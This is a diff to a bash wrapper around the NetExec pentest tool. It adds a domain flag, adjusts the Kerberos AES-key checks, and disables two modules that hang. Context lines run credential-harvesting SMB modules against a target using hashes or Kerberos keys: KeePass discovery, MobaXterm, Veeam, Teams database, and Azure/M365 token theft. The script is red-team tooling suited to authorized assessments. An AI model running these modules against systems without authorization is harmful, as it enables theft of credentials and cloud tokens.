@@ -24,6 +24,7 @@ usage() {
   echo "  -u            Username"
   echo "  -p            Password"
   echo "  -H            NTLM hash"
+  echo "  -d            Domain (passed as -d to nxc)"
   echo "  --aesKey      Kerberos AES key (requires --kdcHost)"
   echo "  --kdcHost     Domain Controller to contact (used with --aesKey)"
   echo "  --use-kcache  Use Kerberos ccache ticket (no user/pass/hash needed)"
@@ -50,6 +51,7 @@ shift
 LOCAL_AUTH=0
 AESKEY=""
 KDCHOST=""
+DOMAIN=""
 USE_KCACHE=0
 USER_SET=0
 
@@ -82,6 +84,10 @@ while [[ $# -gt 0 ]]; do
     ;;
   -H)
     HASH="$2"
+    shift 2
+    ;;
+  -d)
+    DOMAIN="$2"
     shift 2
     ;;
   --aesKey)
@@ -156,9 +162,9 @@ if [[ $HAS_AUTH -eq 1 ]]; then
       echo -e "${RED}[-] Cannot use --use-kcache with -p, -H, or --aesKey${NC}"
       usage
     fi
-  elif [[ -n "$AESKEY" || -n "$KDCHOST" ]]; then
-    if [[ -z "$AESKEY" || -z "$KDCHOST" ]]; then
-      echo -e "${RED}[-] --aesKey requires --kdcHost and vice versa${NC}"
+  elif [[ -n "$AESKEY" ]]; then
+    if [[ -z "$KDCHOST" ]]; then
+      echo -e "${RED}[-] --aesKey requires --kdcHost${NC}"
       usage
     fi
     if [[ -n "$PASS" || -n "$HASH" ]]; then
@@ -242,6 +248,15 @@ if [[ $HAS_AUTH -eq 1 ]]; then
     fi
   fi
 
+  if [[ -n "$DOMAIN" ]]; then
+    BASE_AUTH_ARGS+=" -d $DOMAIN"
+  fi
+
+  # Add --kdcHost if set and not already added via --aesKey
+  if [[ -n "$KDCHOST" && -z "$AESKEY" ]]; then
+    BASE_AUTH_ARGS+=" --kdcHost $KDCHOST"
+  fi
+
   AUTH_ARGS="$BASE_AUTH_ARGS"
   if [[ $LOCAL_AUTH -eq 1 && $USE_KCACHE -eq 0 && -z "$AESKEY" ]]; then
     AUTH_ARGS+=" --local-auth"
@@ -279,7 +294,7 @@ elevated)
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M keepass_discover
   log "Use -M keepass_trigger if found" "$INTERESTINGFILE"
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M mobaxterm
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M mremoteng
+  # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M mremoteng # Prompts for password and gets stuck
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M msol
   # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M nanodump # Require nanodump on system
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad
@@ -296,7 +311,8 @@ elevated)
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M snipped
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M teams_localdb
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M veeam
-  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M vnc
+  # run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M vnc # Prompts for password and gets stuck
+
   run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M wam # Azure and M365 tokens
 
   # Other session enumeration
